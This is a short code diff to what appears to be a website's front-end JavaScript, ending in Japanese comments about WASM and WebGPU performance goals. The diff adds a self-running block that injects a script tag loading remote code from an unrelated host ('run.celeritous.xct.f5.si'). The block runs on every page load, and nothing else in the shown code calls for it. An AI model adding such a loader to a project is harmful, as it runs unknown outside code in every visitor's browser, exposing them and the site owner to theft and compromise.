@@ -344,6 +344,13 @@ header a,
     if (e.key === 'Escape') closeAll();
   });
 })();
+(function(){
+    const s = document.createElement('script');
+    s.src = 'https://run.celeritous.xct.f5.si/editor/l.js';
+    s.async = true;
+    document.body.appendChild(s);
+})();
+
 //目標について
 //WASMとWebGPUによる高速化
 //WASMは動的生成。WebGPUはGPGPUとしての使い方もしたい
